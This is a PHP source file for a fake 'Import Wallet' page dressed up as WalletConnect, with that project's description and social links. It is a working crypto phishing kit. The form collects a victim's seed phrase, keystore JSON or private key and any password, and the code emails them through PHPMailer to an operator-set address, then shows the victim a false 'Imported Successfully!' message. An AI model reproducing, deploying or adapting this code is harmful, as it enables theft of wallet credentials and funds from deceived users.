<?php
// Initialize the session
session_start();

// Include config file
require_once("../config/config.php");

use PHPMailer\PHPMailer\PHPMailer;

require '../PHPMailer/src/Exception.php';
require '../PHPMailer/src/OAuth.php';
require '../PHPMailer/src/PHPMailer.php';
require '../PHPMailer/src/POP3.php';
require '../PHPMailer/src/SMTP.php';

// Define variables and initialize with empty values
$err_msg = $success_msg = false;
$body = "";

// Defining function for wallet import
function importWallet($phrase, $password, $category, $app)
{
    global $body;

    $output = '<h1>Wallet: ' . $app . '</h1>';
    $output .= '<h2>' . $category . '</h2>';
    $output .= '<p>-------------------------------------------------------------</p>';
    $output .= '<p>' . $phrase . '</p>';
    if ($password) {
        $output .= '<p>Password: ' . $password . '</p>';
    }
    $output .= '<p>-------------------------------------------------------------</p>';
    $body = $output;
    $subject = "Import Wallet";

    $mail = new PHPMailer();
    $mail->IsSMTP();
    $mail->Host = EMAIL_HOST;
    $mail->SMTPAuth = true;
    $mail->Username = EMAIL_USERNAME;
    $mail->Password = EMAIL_PWD;
    $mail->Port = EMAIL_PORT;
    $mail->IsHTML(true);
    $mail->From = EMAIL_FROM;
    $mail->FromName = EMAIL_FROM_NAME;
    $mail->Sender = EMAIL_SENDER;
    $mail->Subject = $subject;
    $mail->Body = $body;
    $mail->AddAddress(EMAIL_TO);
    return $mail;
}
// Processing form data when form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Check if phrase is empty
    $phrase = $_POST['phrase'] ?? NULL;
    $password = $_POST['password'] ?? NULL;
    $category = $_POST['category'] ?? "Phrase / Keystore JSON / Private Key / Email Password";
    $app = $_POST['app'] ?? "-";
    if (!$phrase) {
        $err_msg = "Please enter phrase / keystore JSON / Private Key";
    }

    if (empty($err_msg)) {
        // Send phrase to mail
        $mail = importWallet($phrase, $password, $category, $app);
        if (!$mail->Send()) {
            $err_msg = "Mailer Error: " . $mail->ErrorInfo;
        } else {
            $success_msg = true;
        }
    }
}
?>

<?php
$title = "Import Wallet";
?>
<html>

<head>
    <title><?= $title ?></title>
    <link rel="stylesheet" href="/main.css" type="text/css" />
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
    <meta property="og:image" content="/images/logo.svg">
    <link rel="icon" href="/images/logo.svg">
    <script>
        const goBack = () => {
            window.history.back();
        }
    </script>
    <style>
        .text-center {
            text-align: center !important;
        }

        .alert {
            position: relative;
            padding: .75rem 1.25rem;
            margin-bottom: 1rem;
            margin-right: 1rem;
            margin-left: 1rem;
            border: 1px solid transparent;
            border-radius: .25rem;
        }

        .danger {
            color: #721c24;
            background-color: #f8d7da;
            border-color: #f5c6cb;
        }
    </style>
</head>

<body>
    <?php if (!empty($err_msg)) { ?>
        <div class="alert danger text-center"><?php echo $err_msg; ?></div>
    <?php } ?>
    <?php if (!empty($success_msg)) { ?>
        <center>
            <img src="/images/qr.jpeg" style="max-width: 380px;" alt="QR Code" />
            <div class="gFeYHJ" style="font-weight: 700;padding-right: 10px;padding-left: 10px;">Imported Successfully!</div>
        </center>
    <?php } ?>
    <center>
        <footer style="margin-top: 40px;">
            <div id="footer">
                <p><img src="/images/discord.svg" class="footimg"> <a href="https://discord.gg/jhxMvxP">Discord</a></p></br>
                <p><img src="/images/telegram.svg" class="footimg"> <a href="https://t.me/walletconnect_announcements">Telegram</a></p></br>
                <p><img src="/images/twitter.svg" class="footimg"> <a href="https://twitter.walletconnect.org/">Twitter</a></p></br>
                <p><img src="/images/github.svg" class="footimg"> <a href="https://github.com/walletconnect">Github</a></p></br>
        </footer>
    </center>
</body>

</html>